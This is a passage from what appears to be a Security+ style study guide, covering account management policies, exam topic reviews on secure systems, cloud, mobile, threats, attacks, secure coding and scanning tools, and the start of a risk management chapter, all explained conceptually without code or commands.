I t ’s common for an organization to adopt a standard naming convention to ensure user account names and email addresses are created similarly. example, one convention uses the first name, a dot, and the last name. This creates accounts like homer.simpson and bart.simpson. If the organization hires a second person with the same name, such as a second Bart Simpson, the naming convention might specify adding a number to the name, such as bart.simpson2.
You probably won’t need to design a naming convention. However, if you start with a different organization and you need to create accounts, you should understand that the organization probably has a naming convention in place. You should follow the convention for any accounts you create.
Prohibiting Shared and Generic Accounts
Account management policies often dictate that personnel should not use shared or generic accounts. Instead, each user has at least one account, which is only accessible to that user. If multiple users share a single account, you cannot implement basic authorization controls. As a reminder, four key concepts are:
Identification. Users claim an identity with an identifier such as a username.
Authentication. Users prove their identity using an
authentication method such as a password. Authorization.Usersareauthorizedaccesstoresources,basedon their proven identity.
Accounting. Logs record activity using the users’claimed identity.
Imagine that Bart, Maggie, and Lisa all used a Guest account. If you want to give Lisa access to certain files, you’d grant access to the Guest account, but Bart and Maggie would have the same access. If Bart deleted the files, logs would indicate the Guest account deleted the files, but you wouldn’t know who actually deleted them. In contrast, if users have unique user accounts, you can give them access to resources individually. Additionally, logs would indicate exactly who took an action.
Note that having a single, temporary user log on with the Guest account does support identification, authentication, authorization, and accounting. It is only when multiple users are sharing the same account that you lose these controls. Still, some organizations prohibit the use of the Guest account for any purposes.
Disablement Policies
Many organizations have a disablement policy that specifies how to manage accounts in different situations. example, most organizations require administrators to disable user accounts as soon as possible when employees leave the organization. Additionally, i t ’s common to disable default accounts (such as the Guest account mentioned previously) to prevent them from being used.
Disabling is preferred over deleting the account, at least initially. If administrators delete the account, they also delete any encryption and security keys associated with the account. However, these keys are retained when the account is disabled. example, imagine that an employee encrypted files with his account. The operating system uses cryptography keys to encrypt and decrypt these files. If administrators deleted this account, these files may remain encrypted forever unless the organization has a key escrow or recovery agent that can access thefiles.
Some contents of an account disablement policy include:
Terminated employee. An account disablement policy specifies that accounts for ex-employees are disabled as soon as possible. This ensures a terminated employee doesn’t become a disgruntled ex- employee who wreaks havoc on the network. Note that “terminated” refers to both employees who resign and employees who are fired.
 Leave of absence. If an employee will be absent for an extended period, the account should be disabled while the employee is away. Organizations define extended period differently, with some organizations defining it as only two weeks, whereas other organizations extend it out to as long as two months.
Delete account. When the organization determines the account is no longer needed, administrators delete it. example, the policy may direct administrators to delete accounts that have been inactive for 60 or 90 days.
 Recovering Accounts
In some situations, administrators need to recover accounts. The two primary account recovery scenarios are:
Enable a disabled account. Administrators can reset the user’s password and take control of the account. Similarly, they pass control of the account to someone else, such as a supervisor or manager of an ex- employee. Administrators reset the user’s password, set it to expire on first use, and then give the password to the other person.
Recover a deleted account. It is also possible to recover a deleted account. This is more complex than simply creating another account with the same name. Instead, administrators follow detailed procedures to recover the account.
Time-of-Day Restrictions  Time-of-day restrictions specify when users can log on to a computer. If a user tries to log on to the network outside the restricted time, the system denies access to the user.
As an example, imagine a company operates between 8:00 a.m. and 5:00 p.m. on a daily basis. Managers decide they don’t want regular users logging on to the network except between 6:00 a.m. and 8:00 p.m., Monday through Friday. You could set time-of-day restrictions for user accounts, as shown in Figure
2.5. If a user tries to log on outside the restricted time (such as during the weekend), the system prevents the user from loggingon.
Figure 2.5: User account properties with time restrictions
If users are working overtime on a project, the system doesn’t log them off when the restricted time arrives. example, if Maggie is working late on a Wednesday night, the system doesn’t log her off at 8:00 p.m.(assuming the time restrictions are set as shown in Figure 2.5). However, the system will prevent her from creating any new networkconnections.
Location-Based Policies
Location-based policies restrict access based on the location of the user.
The “Somewhere You Are” section earlier in this chapter discussed common methods used to enforce this. example, geolocation technologies can often detect a location using the IP address, and block any traffic from unacceptable addresses, such as from foreign countries. It’s also possible to identify a set of IP addresses as the only addresses that are acceptable. This is often referred to as whitelisting the IP addresses.
Within a network, it’s possible to restrict access based on computer names or MAC addresses. F o r example, imagine Bart has been logging on to multiple computers with his account. It is possible to restrict his account to only his computer. When he tries to log on to his account, he is successful. If he tries to log on to another computer, the location-based policy blocks him.
 Expiring Accounts and Recertification
It’s possible to set user accounts to expire automatically. When the account expires, the system disables it, and the user is no longer able to log on using the account.
If you look back at Figure 2.5, it shows the properties of an account. The Account Expires section is at the bottom of the page, and the account is set to expire on September 1. When September 1 arrives, the account is automatically disabled and the user will no longer be able to log on.
It’s common to configure temporary accounts to expire. example, an organization may hire contractors for a 90-day period to perform a specific job. An administrator creates accounts for the contractors and sets them to expire in 90 days. This automatically disables the accounts at the end of the contract.
If the organization extends the contract, it’s a simple matter to recertify the account. Administrators verify that the contract has been extended, change the expiration date, and enable the account.
 Account Maintenance
Administrators routinely perform account maintenance. This is often done with scripts to automate the processes.
example, it’s relatively simple to create and run a script listing all enabled accounts that haven’t been used in the last 30 days in a Microsoft AD DS domain. This provides a list of inactive accounts. Often, these are
accounts of ex-employees or temporary employees who are no longer at the organization. Ideally, an account disablement policy would ensure that the accounts are disabled as soon as the employee leaves. The scripts provide an additional check to ensure inactive accounts aredisabled.
Additionally, account maintenance includes deleting accounts that are no longer needed. example, if an organization has a policy of disabling accounts when employees leave, but deleting them 60 days later, account maintenance procedures ensure the accounts are deleted. Credential Management
A credential is a collection of information that provides an identity (such as a username) and proves that identity (such as with a password). Over time, users often have multiple credentials that they need to remember, especially when they access many web sites. Credential management systems help users store these credentials securely. The goal is to simplify credential
management for users, while also ensuring that unauthorized personnel do not have access to the users’credentials.
example of a credential management system, Windows 10 includes the Credential Manager, accessible from Control Panel. Users are able to add credentials into the Credential Manager, which stores them securely in special folders called vaults. Then, when users access web sites needing credentials, the system automatically retrieves the credentials from the vault and submits them to the web site.
Similarly, web browsers such as Google Chrome use a credential management system to remember passwords. When you access a web site that needs your password, Chrome prompts you asking if you’d like Chrome to remember it. Later, when you visit the same web site, Chrome fills in the credentials for you.
Chapter 5 Exam Topic Review
Implementing Secure Systems
Least functionality is a core secure system design principle. It states that systems should be deployed with only the applications, services, and protocols they need to function.
A trusted operating system meets a set of predetermined requirements such as those defined in the Common Criteria. It typically uses the mandatory access control (MAC) model. (Label)
A master image provides a secure starting point for systems. Master images are typically created with templates or other baselines to provide a secure starting point for systems. Integrity measurement tools detect when a system deviates from the baseline.
Patch management procedures ensure operating systems and applications are
kept up to date with current patches. This ensures they are protected against
known vulnerabilities.
Change management policies define the process for making changes and help
reduce unintended outages from changes.
Application whitelisting allows authorized software to run, but blocks all other
software. Application blacklisting blocks unauthorized software, but allows
other software to run.
Sandboxing provides a high level of flexibility for testing security controls and
testing patches. You can create sandboxes in virtual machines (VMs) and
with the chroot command on Linux systems.
Electromagnetic interference (EMI) comes from: motors, power lines, and
fluorescent lights and can be prevented with shielding.
Electromagnetic pulse (EMP) is a short burst of electromagnetic energy. Mild
forms such as electrostatic discharge and lightning can be prevented but
EMP damage from military weapons may not be preventable.
Full disk encryption (FDE) encrypts an entire disk. A self- encrypting drive (SED) includes the hardware and software necessary to automatically
encrypt a drive.
Trusted Platform Module (TPM) is a chip included with many laptops and some
mobile devices and it provides full disk encryption, a secure boot process, and supports remote attestation. TPMs have an encryption key burned into them that provides a hardware root of trust.
hardware security module (HSM) is a removable or external device used for encryption. An HSM generates and stores RSA encryption keys and can be integrated with servers to provide hardware-based encryption.
Summarizing Cloud Concepts
Cloud computing provides an organization with additional resources. Most cloud services are provided via the Internet or a hosting provider. On- premise clouds are owned and maintained byan organization.
Software as a Service (SaaS) includes web-based applications such as web-based email.
Infrastructure as a Service (IaaS) provides hardware resources via the cloud. It can help an organization limit the size of their hardware footprint and reduce personnel costs.
Platform as a Service (PaaS) provides an easy-to-configure operating system
and on- demand computing for customers.
cloud access security broker (CASB) is a software tool or service deployed
between an organization’s network and the cloud provider. It monitors all network traffic and can enforce security policies acting as Security as a Service.
Private clouds are only available for a specific organization. Public cloud services are provided by third-party companies and available to anyone. A community cloud is shared by multiple organizations. A hybrid cloud is a combination of two or more clouds.
- Deploying Mobile Devices Securely
- Mobile devices include smartphones and tablets and run a mobile operating system.
- Corporate-owned, personally enabled (COPE) mobile devices are owned by the organization, but employees can use them for personal reasons.
- Bring your own device (BYOD) policies allow employees to connect their mobile device to the organization’s network. Choose your own device (CYOD) policies include a list of acceptable devices and allow employees with one of these devices to connect them to the network.
- A virtual desktop infrastructure (VDI) is a virtual desktop and these can be created so that users can access them from a mobile device.
- Mobile devices can connect to the Internet, networks, and other devices using ANT, infrared, cellular, wireless, satellite, Bluetooth, near field communication (NFC), and USB connections.
- Mobile device management (MDM) tools help ensure that devices meet minimum security requirements. They can monitor devices, enforce security policies, and block network access if devices do not meet these requirements.
- MDM tools can restrict applications on devices, segment and encrypt data, enforce strong authentication methods, and implement security methods such as screen locks and remote wipe. that automatically locks the device after a period of time. A remote wipe
signal removes all the data from alost phone.
- Geolocation uses Global Positioning System (GPS) to identify a device’s
location. Geofencing uses GPS to create a virtual fence or geographic boundary. Organizations use geofencing to enable access to services or devices when they are within the boundary, and block access when they are outside of the boundary. Geotagging uses GPS to add geographical information to files (such as pictures) when posting them on social media sites.
- A third-party app store is something other than the primary store for a mobile device. Apple’s App Store is the primary store for Apple devices. Google Play is a primary store forAndroid devices.
- Jailbreaking removes all software restrictions on Apple devices. Rooting provides users with root-level access to an Android device. Custom firmware can also root an Android device. MDM tools block network access for jailbroken or rooted devices.
- Sideloading is the process of copying an application to an Android device instead of installing it from an online store.
- Universal Serial Bus On-The-Go (USB OTG) cable allows you to connect mobiledevices.
- Tethering allows one mobile device to share its Internet connection with other devices. Wi-Fi Direct allows you to connect devices together without a wireless router.
Exploring Embedded Systems
An embedded system is any device that has a dedicated function and uses a computer system to perform that function. A security challenge with embedded systems is keeping them up to date.
Embedded systems include smart devices sometimes called the Internet of things (IoT), such as wearable technology and home automation devices.
A system on a chip (SoC) is an integrated circuit that includes a full computing system.
A supervisory control and data acquisition (SCADA) system controls an industrial control system (ICS). The ICS is used in large facilities such as power plants or water treatment facilities. SCADA and ICS systems are ▪


## typically in isolated networks without access to the Internet, and are
sometimes protected by network intrusion prevention systems (NIPSs).
A real-time operating system (RTOS) is an operating system that reacts to input
within a specific time.
Embedded systems are found in many common and special-purpose devices.
This includes multi-function devices (MFDs), such as printers; heating, ventilation, and air conditioning (HVAC) systems; medical devices; automotive vehicles; aircraft; and unmanned aerial vehicles (UAVs).
Protecting Data
The primary method of protecting the confidentiality of data is with encryption and strong access controls. File system security includes the use of encryption to encrypt files and folders.
You can encrypt individual columns in a database, entire databases, individual files, entire disks, and removable media.
Users should be given only the permissions they need. When they have too much access, it can result in access violations or the unauthorized access of data.
You can use the chmod command to change permissions on a Linux system.
Data exfiltration is the unauthorized transfer of data outside an organization.
Data loss prevention (DLP) techniques and technologies help prevent data loss.
They can block transfer of data to USB devices and analyze outgoing data via email to detect unauthorized transfers. Cloud-based DLP systems can enforce security policies for any data stored in the cloud.
Chapter 6 Exam Topic Review
When preparing for the exam, make sure you understand these key concepts covered in this chapter.
Understanding Threat Actors
Script kiddies use existing computer scripts or code to launch attacks. They 447

▪
typically have very little expertise or sophistication, and very little funding.
hacktivist launches attacks as part of an activist movement or to further a cause.
Insiders (such as employees of a company) have legitimate access to an organization’s internal resources. They sometimes become malicious insiders out of greed or revenge.
Competitors sometimes engage in attacks to gain proprietary information about another company.
Organized crime is an enterprise that employs a group of individuals working togetherincriminalactivities.Theirprimary motivation ismoney.
Some attackers are organized and sponsored by a nation-state or government.
advanced persistent threat (APT) is a targeted attack against a network. An APT group has both the capability and intent to launch sophisticated and
targeted attacks. They are sponsored by a nation-state and often have a significant amount of resources and funding.
A common method attackers often use before launching an attack is to gather informationfromopen-sourceintelligence,includinganyinformation available via web sites and social media.
Determining Malware Types
Malware includes several different types of malicious code, including viruses, worms, logic bombs, backdoors, Trojans, ransomware, rootkits, and more.
virus is malicious code that attaches itself to a host application. The code runs when the application is launched.
worm is self-replicating malware that travels throughout a network without user intervention.
logic bomb executes in response to an event, such as a day, time, or condition. 448

▪
Malicious insiders have planted logic bombs into existing systems, and these logic bombs have delivered their payload after the employee left the company.
Backdoors provide another way of accessing a system. Malware often inserts backdoors into systems, giving attackers remote access to systems.
Trojan appears to be one thing, such as pirated software orfree antivirus software, but is something malicious. A remote access Trojan (RAT) is a type
of malware that allows attackers to take control of systems from remote locations.
Drive-by downloads often attempt to infect systems with Trojans.
Ransomware is a type of malware that takes control of a user’s system or data. Criminals attempt to extort payment as ransom combined to return
control to the user. Crypto-malware is ransomware that encrypts the user’s data. Attackers demand payment to decrypt the data.
Spyware is software installed on user systems without the user’s knowledge or consent and it monitors the user’s activities. It sometimes includes a keylogger that records user keystrokes.
botnet is a group of computers called zombies controlled through a command- and-control server. Attackers use malware to join computers to botnets. Bot herders launch attacks through botnets.
Rootkits take root-level or kernel-level control of a system. They hide their processes to avoid detection. They can remove user privileges and modify system files.
Recognizing Common Attacks
Social engineering is the practice of using social tactics to gain information or trick users into performing an action they wouldn’t normally take.
Social engineering attacks can occur in person, over the phone, while surfing the Internet, and via email. Many social engineers attempt to impersonate
         ▪


## others.
Shoulder surfing is an attempt to gain unauthorized information through casual observation, such as looking over someone’s shoulder, or monitoring screens with a camera. Screen filters can thwart shoulder surfing attempts.
hoax is a message, often circulated through email, that tells of impending doom from a virus or other security threat that simply doesn’t exist.
Tailgating is the practice of one person following closely behind another without showing credentials. Mantraps help prevent tailgating.
Dumpster divers search through trash looking for information. Shredding or burning documents reduces the risk of dumpsterdiving.
Watering hole attacks discover sites that a targeted group visits and trusts. Attackers then modify these sites to download malware.When the targeted group visits the modified site, they are more likely to download and install infected files.
Spam is unwanted or unsolicited email. Attackers often use spam in different types of attacks.
Phishing is the practice of sending email to users with the purpose of tricking them into revealing sensitive information, installing malware, or clicking on a link.
Spear phishing and whaling are types of phishing. Spear phishing targets specific groups of users and whaling targets high-level executives.
Vishing is a form of phishing that uses voice over the telephone and often uses Voice over IP (VoIP). Some vishing attacks start with a recorded voice and then switch over to a live person.
Blocking Malware and Other Attacks
Antivirus software can detect and block different types of malware, such as worms, viruses, and Trojans. Antivirus software uses signatures to detect
         ▪


## known malware.
Whendownloadingsignaturesmanually,hashescanverifythe integrityof signature files.
Antivirus software typically includes a file integrity checker to detect files modified by a rootkit.
Data execution prevention (DEP) prevents code from executing in memory locations marked as nonexecutable. The primary purpose of DEP is to protect a system frommalware.
Advanced malware tools monitor files and activity within the network. Anti-spam software attempts to block unsolicited email. You can configure a
spam filter to block individual email addresses and email domains.
Security-related awareness and training programs help users learn about new threats a n d security trends, such as new viruses, new phishing attacks,
and zero-day exploits. Zero- d a y exploits take advantage of vulnerabilities that are not known by trusted sources.
Social engineers and other criminals employ several psychology-based principles to help increase the effectiveness of their attacks. They are authority, intimidation, consensus, scarcity, urgency, familiarity, and trust.
       Chapter 7 Exam Topic Review
When preparing for the exam, make sure you understand the key concepts covered in this chapter.

---

## Comparing Common Attacks
- DoS attack is an attack launched from a single system and attempts to disrupt services.
- DDoS attacks are DoS attacks from multiple computers. typically include sustained, abnormally high network traffic.
- Spoofing attacks attempt to impersonate another system.
  - MAC address spoofing changes the source MAC address
  - IP spoofing changes the source IP address.
- ARP poisoning attacks attempt to mislead computers or switches about the actual MAC address of a system.
  - They can be used to launch a man-in-the-middle attack.
- DNS poisoning attacks modify DNS data and can redirect users to malicious
sites.
  - Many DNS servers use DNSSEC to protect DNS records and prevent
DNS poisoning attacks.
- Amplification attacks send increased traffic to, or request additional traffic
from, a victim.
- Password attacks attempt to discover passwords.
  - A brute force attack attempts to guess all possible character combinations
  - a dictionary attack uses all the words and character combinations stored in a file.
  - Account lockout policies thwart online brute force attacks and complex passwords thwart offline password attacks.
- Passwords are often stored as a hash. Weak hashing algorithms are susceptible to collisions, which allow different passwords to create the same hash.
- In a pass the hash attack, the attacker discovers the hash of the user’s password and then uses it to log on to the system as the user.
- In a birthday attack, an attacker is able to create a password that produces the same hash as the user’s actual password.
  - This is also known as a hash collision.
  - A hash collision occurs when the hashing algorithm creates the same
hash fromdifferent passwords.
- Password salting adds additional characters to passwords before hashing   - prevents many types of attacks, including dictionary, brute force, and rainbow table attacks.
- Replay attacks capture data in a session with the intent of using information to impersonate one of the parties. Timestamps and sequence numbers thwart replay attacks.
- A known plaintext attack is possible if an attacker has both the plaintext and the ciphertext created by encrypting the plaintext. It makes it easier to decrypt other data using a similar method.
- Attackers buy domain names with minor typographical errors in typo squatting (also called URL hijacking) attacks. The goal is to attract traffic when users enter incorrect URLs. Attackers can configure the sites with malware to infect visitors or configure the site to generate ad revenue for the attacker.
- Clickjacking tricks users into clicking something other than what they think they’re clicking.
- session ID attack: utilize the user’s session ID to impersonate the user.
- Domain hijacking attacks allow an attacker to change the registration of a
domain name without permission from theowner.
- A man-in-the-browser is a proxy Trojan horse that exploits vulnerable web browsers. When successful, it allows attacks to
capture keystrokes and all data sent to and from the browser.
- A driver shim is additional code that can be run instead of the original driver.
- Attackers exploiting unknown or undocumented vulnerabilities are taking
advantage of zero-day vulnerabilities. The vulnerability is no longer a zero-
day vulnerability after the vendor releases a patch to fix it.
- Buffer overflows occur when an application receives more data, or unexpected data, than it can handle and exposes access to system memory. Integer overflow attacks attempt to use or create a numeric value bigger
than the application can handle.
- Buffer overflow attacks exploit buffer overflow vulnerabilities. A common
method uses NOP instructions or NOP sleds such as a string of x90 commands. Two primary protection methods against buffer overflow attacks are input validation and keeping a system up to date.
Summarizing Secure Coding Concepts
- Compiled code has been optimized by an application and converted into an executable file. Runtime code is code that is evaluated, interpreted, and executed when the code is run. - A common coding error in web-based applications is the lack of input validation.
- Input validation checks the data before passing it to the application
  - prevents: buffer overflow, SQL injection, command injection, and
cross-site scripting attacks.
- Server-side input validation is the most secure. Attackers can bypass client-
side input validation, but not server-side input validation.
- Race conditions allow two processes to access the same data at the same
time, causing inconsistent results. Problems can be avoided by locking data
before accessing it.
- Error-handling routines within applications can prevent application failures
and protect the integrity of the operating systems. Error messages shown to users should be generic, but the application should log detailed information on the error.
- Code signing uses a digital signature within a certificate to authenticate and validate software code.
- Code quality and testing techniques include static code analysis, dynamic analysis (such as fuzzing), stress testing, sandboxing, and model verification.
- Software development life cycle (SDLC) models provide structure for software development projects. Waterfall uses multiple stages with each stage feeding the next stage. Agile is a more flexible model and it emphasizes interaction with all players in a project.
- Secure DevOps is an agile-aligned methodology. It stresses security throughout the lifetime of the project.
Identifying Application Attacks
- Common web servers are Apache (running on Linux) and Internet Information Services (running on Microsoft servers).
- Databases are optimized using a process called normalization. A database is considered normalized when it conforms to the first three normal forms.
- SQL injection attacks provide information about a database and can allow an attacker to read and modify data within a database. Input validation and stored procedures provide the best protection against SQL injection attacks.
- Cross-site scripting (XSS) allows an attacker to redirect users to malicious web sites and steal cookies. It uses HTML and JavaScript tags with < and > characters. - Cross-site request forgery (XSRF) causes users to perform actions on web sites without their knowledge and allows attackers to steal cookies and harvest passwords.
- XSS and XSRF attacks are mitigated with input validation techniques.
Understanding Frameworks and Guides
- Frameworks are references that provide a foundation. Cybersecurity frameworks typically use a structure of basic concepts and provide guidance on how to implementsecurity.
- Regulatory frameworks are based on relevant laws and regulations. A non- regulatory framework is not required by any law.
- Some frameworks are used within a single country (and referred to as national frameworks), while others are used internationally.
- Some frameworks only apply to certain industries. example, organizations that handle credit cards typically comply with the Payment Card Industry Data Security Standard (PCI DSS).
- Vendor-specific guides should be used when configuring specific systems.
Chapter 8 Exam Topic Review
- When preparing for the exam, make sure you understand these key concepts covered in this chapter.
Understanding Risk Management
- A risk is the likelihood that a threat will exploit a vulnerability. A threat is a potential danger that can compromise confidentiality, integrity, or availability of data or a system. A vulnerability is a weakness.
- Impact refers to the magnitude of harm that can be caused if a threat exercises a vulnerability.
- Threat assessments help an organization identify and categorize threats. An environmental threat assessment evaluates the likelihood of an environmental threat, such as a natural disaster, occurring. Manmade threat assessments evaluate threats fromhumans.
- Internal threat assessments evaluate threats from within an organization. External threat assessment evaluates threats from outside an organization.
- A vulnerability is a flaw or weakness in software or hardware, or a weakness in a process that a threat could exploit, resulting in a security breach.
- Risk management attempts to reduce risk to a level that an organization can accept, and the remaining risk is known as residual risk.
- Senior management is responsible for managing risk and the losses associated from residual risk.
- You can avoid a risk by not providing a service or participating in a risky activity.Purchasinginsurance,suchasfireinsurance,transfersthe riskto another entity. Security controls mitigate, or reduce, risks. When the cost of a control outweighs a risk, it is common to accept the risk.
- A risk assessment quantifies or qualifies risks based on different values or judgments. It starts by identifying asset values and prioritizing high-value items.
- Quantitative risk assessments use numbers, such as costs and asset values. The single loss expectancy (SLE) is the cost of any single loss. The annual rate of occurrence (ARO) indicates how many times the loss will occur annually. You can calculate the annual loss expectancy (ALE) as SLE × ARO.
- Qualitative risk assessments use judgments to prioritize risks based on likelihood of occurrence and impact. These judgments provide a subjective ranking.
- Risk assessment results are sensitive. Only executives and security professionals should be granted access to risk assessment reports.
- A risk register is a detailed document listing information about risks. It typically includes risk scores along with recommended security controls to reduce the risk scores.
- A supply chain assessment evaluates a supply chain needed to produce and sell a product. It includes raw materials and all the processes required to create and distribute a finished product.
Comparing Scanning and Testing Tools
- A port scanner scans systems for open ports and attempts to discover what services and protocols are running.
- Network mapping identifies the IP addresses of hosts within a network. Network scanners expand on network mapping. They identify the operating system running on each host. They can also identify services and protocols running on each host.
- Wireless scanners can detect rogue access points (APs) in a network. Many can also crack passwords used by the APs.
- Banner grabbing queries remote systems to detect their operating system, along with services, protocols, and applications running on the remote system.
- Vulnerability scanners passively test security controls to identify vulnerabilities, a lack of security controls, and common misconfigurations. They are effective at discovering systems susceptible to an attack without exploiting the systems.
- A false positive from a vulnerability scan indicates the scan detected a vulnerability, but the vulnerability doesn’t exist.
- Credentialed scans run under the context of an account and can be more accurate than non- credentialed scans, giving fewer false positives.
- Penetration testers should gain consent prior to starting a penetration test. A rules-of- engagement document identifies the boundaries of the test.
- A penetration test is an active test that attempts to exploit discovered vulnerabilities. It starts with a vulnerability scan and then bypasses or actively tests security controls to exploit vulnerabilities.
- After initial exploitation, a penetration tester uses privilege escalation techniques to gain more access.
- Pivoting during a penetration test is the process of using an exploited system to access other systems.
- Inblackboxtesting,testersperformapenetrationtestwithzeroprior knowledge of the environment. White box testing indicates that the testers have full knowledge of the environment, including documentation and source code for tested applications. Gray box testing indicates some knowledge of the environment.
- Scans can be either intrusive or non-intrusive. Penetration testing is intrusive (also called invasive) and can potentially disrupt operations. Vulnerability
 - Passive reconnaissance gathers information from open-source intelligence.
- Active reconnaissance uses scanning techniques to gather information. testing is non-intrusive (also called non-invasive).
- Exploitation frameworks store information about security vulnerabilities. They are often used by penetration testers (and attackers) to detect and exploit software.
Using Security Tools
- Protocol analyzers (sniffers) can capture and analyze data sent over a network. Testers (and attackers) use protocol analyzers to capture cleartext data sent across a network.
- Administrators use protocol analyzers for troubleshooting communication issues by inspecting protocol headers to detect manipulated or fragmented packets.
- Captured packets show the type of traffic (protocol), source and destination IP addresses, source and destination MAC addresses, and flags.
- Tcpdump is a command-line protocol analyzer. Captured packet files can be analyzed in a graphical protocol analyzer such as Wireshark.
- Nmap is a sophisticated network scanner run from the command line.
- Netcat is a command-line tool used to remotely administer servers. Netcat
can also be used for bannergrabbing.
- Logs record events and by monitoring logs, administrators can detect event anomalies.
- Security logs track logon and logoff activity on systems.
- System logs identify when services start and stop.
- Firewall and router logs identify the source and destination of traffic.
- A security information and event management (SIEM) system can aggregate and correlate logs from multiple sources in a single location. A SIEM also provides continuous monitoring and automated alerting and triggers.
- Continuous security monitoring helps an organization maintain its security posture, by verifying that security controls continue to function as intended.
- User auditing records user activities. User auditing reviews examine user activity.
- Permission auditing reviews help ensure that users have only the rights and permissions they need to perform their jobs, and no more. Understanding Risk Management
Risk is the likelihood that a threat will exploit a vulnerability. A vulnerability is a weakness, and a threat is a potential danger. The result is a negative impact on the organization. Impact refers to the magnitude of harm that can be caused if a threat exercises avulnerability.
example, a system without up-to-date antivirus software is vulnerable to malware. Malware written by malicious attackers is the threat. The likelihood that the malware will reach a vulnerable system represents the risk. Depending on what the malware does, the impact may be an unbootable computer, loss of data, or a remote-controlled computer that has joined a botnet. However, the likelihood of a risk occurring isn’t 100 percent. An isolated system without Internet access, network connectivity, or USB ports has a very low likelihood of malware infection.
The likelihood significantly increases for an Internet-connected system, and it increases even more if a user visits risky web sites and downloads and
installs unverified files.
It’s important to realize that you can’t eliminate risk. Sure, you can avoid
information technology (I T ) risks completely by unplugging your computer and burying it. However, that wouldn’t be very useful. Instead, users and organizations practice risk management to reduce the risks.
You probably practice risk management every day. Driving or walking down roads and streets can be a very dangerous activity. Car-sized bullets are speeding back and forth, representing significant risks to anyone else on the road. However, you mitigate these risks with caution and vigilance. The same occurs with computers and networks. An organization mitigates risks using different types of security controls.
Threats and Threat Assessments
A threat is a potential danger. Within the context of risk management, a threat is any circumstance or event that can compromise the confidentiality, integrity, or availability of data or a system. Threats come in different forms, including the following:
Malicious human threats. Chapter 6, “Comparing Threats, Vulnerabilities, and Common Attacks,” discusses various types of threat actors. They include relatively inexperienced script kiddies, dedicated criminals working within an organized crime group, and sophisticated advanced persistent threats (APTs) sponsored by a government. These are
all malicious human threats. Malicious human threats regularly launch different types of attacks, including network attacks, system attacks, and the release of malware.
Accidental human threats. Users can accidentally delete or corrupt data, or accidentally access data that they shouldn’t be able to access. Even administrators can unintentionally cause system outages. The common cause is by a well-meaning administrator making a configuration change to fix one problem but inadvertently causing another one.
Environmental threats. This includes long-term power failure, which could lead to chemical spills, pollution, or other possible threats to the environment. It also includes natural threats such as hurricanes, floods, tornadoes, earthquakes, landsides, electrical storms, and other similar events.
A threat assessment helps an organization identify and categorize threats. It attempts to predict the threats against an organization’s assets, along with the likelihood the threat will occur. Threat assessments also attempt to identify the potential impact from these threats. Once the organization identifies and prioritizes threats, it identifies security controls to protect against the most serious threats.
Organizations have limited resources, so it’s not possible to protect against all threats. However, threat assessments improve the security posture of any system or application by ensuring that the resources aren’t squandered on low-priority threats. Some common types of threat assessments are:
Environmental. An environmental threat assessment evaluates the likelihood of an environmental threat occurring. example, I live in Virginia Beach, Virginia, and while we’re concerned about the natural threat of hurricanes during the hurricane season, we aren’t very concerned about earthquakes. My sister is a business continuity expert and she lives near San Francisco and works in Silicon Valley. She helps companies prepare for risks associated with earthquakes there, but she spends very little time or energy considering the risk of a hurricane hitting San Francisco.
Manmade. A manmade threat assessment evaluates all threats from humans. These include both malicious human threats and
accidental human threats. A malicious human threat refers to any potential attack from a person or group of people. An accidental human threat refers to any potential loss caused by a person or group accidentally.
Internal. An internal threat assessment evaluates threats from within an organization. This includes threats from malicious employees and threats from accidents. It also includes threats related to hardware failure.
External. An external threat assessment evaluates threats from outside an organization. This includes any threats from external attackers. It also includes any natural threats, such as hurricanes, earthquakes, and tornadoes.
 Vulnerabilities
A vulnerability is a flaw or weakness in software or hardware, or a weakness in a process that a threat could exploit, resulting in a security breach. Examples of vulnerabilities include:
Lack of updates. If systems aren’t kept up to date with patches, hotfixes, and service packs, they are vulnerable to bugs and flaws in the software.
Default configurations. Hardening a system includes changing systems from their default hardware and software configurations, including changing default usernames and passwords. If systems aren’t hardened, they are more susceptible to attacks. Chapter 5, “Securing Hosts and Data,” covers hardening systems in more depth.
Lack of malware protection or updated definitions. Antivirus and anti-spyware methods protect systems from malware, but if they aren’t used and kept up to date, systems are vulnerable to malware attacks. Chapter 6 covers malware types and methods used to protect systems from malware attacks.
Lack of firewalls. If personal and network firewalls aren’t enabled or configured properly, systems are more vulnerable to network and Internet-based attacks.
Lack of organizational policies. If job separation, mandatory vacations, and job rotation policies aren’t implemented, an organization may be more susceptible to fraud and collusion from employees.
Not all vulnerabilities are exploited. example, a user may install a wireless router using the defaults. It is highly vulnerable to an attack, but that doesn’t mean that an attacker will discover it and attack. In other words, just because the wireless router has never been attacked, it doesn’t mean that it isn’t vulnerable. At any moment, a war driving attacker can drive by and exploit the vulnerability.
Risk Management
Risk management is the practice of identifying, monitoring, and limiting
risks to a manageable level. It doesn’t eliminate risks, but instead
identifies methods to limit or mitigate them. The amount of risk that remains after managing risk is residual risk.
The primary goal of risk management is to reduce risk to a level that the organization will accept. Senior management is ultimately responsible for residual risk. Management must choose a level of acceptable risk based on their organizational goals. They decide what resources (such asmoney, hardware, and time) to dedicate to mitigate the risk.
There are multiple risk response techniques, or risk management methods, available to an organization. They include:
Avoid. An organization can avoid a risk by not providing a service or not participating in a risky activity. example, an organization may evaluate an application that requires multiple open ports on the firewall that it considers too risky. It can avoid the risk by purchasing a different application that doesn’t require opening any additional firewall ports. Transfer. The organization transfers the risk to another entity, or at least shares the risk with another entity. The most common method is by purchasing insurance. Another method is by outsourcing, or contracting a third party.
Mitigate. The organization implements controls to reduce risks. These controls either reduce the vulnerabilities or reduce the impact of the threat. example, up-to-date antivirus software mitigates the risks of malware. Similarly, a security guard can reduce
the risk of an attacker accessing a secure area.
Accept. When the cost of a control outweighs a risk, an organization will often accept the risk. example, spending $100 in hardware locks to secure a $15 mouse doesn’t make sense. Instead, the organization accepts the risk of someone stealing a mouse. Similarly, even after implementing controls, residual risk remains and the organization accepts this residual risk.
 Risk Assessment
A risk assessment, or risk analysis, is an important task in risk management. It quantifies or qualifies risks based on different values or judgments. A risk assessment starts by first identifying assets and asset values.
An asset includes any product, system, resource, or process that an organization values. The asset value identifies the worth of the asset to the organization. It can be a specific monetary value or subjective value, such as Low, Medium, and High. The asset value helps an organization focus on the high-value assets and avoid wasting time on low-value assets.
After identifying asset values, the risk assessment then identifies threats and vulnerabilities and determines the likelihood a threat will attempt to exploit a vulnerability. A risk assessment attempts to identify the impact of potential threats and identify the potential harm, and prioritizes risks based on the likelihood of occurrence and impact. Last, a risk assessment includes recommendations on what controls to implement to mitigate risks.
A risk assessment is a point-in-time assessment, or a snapshot. In other words, it assesses the risks based on current conditions, such as current
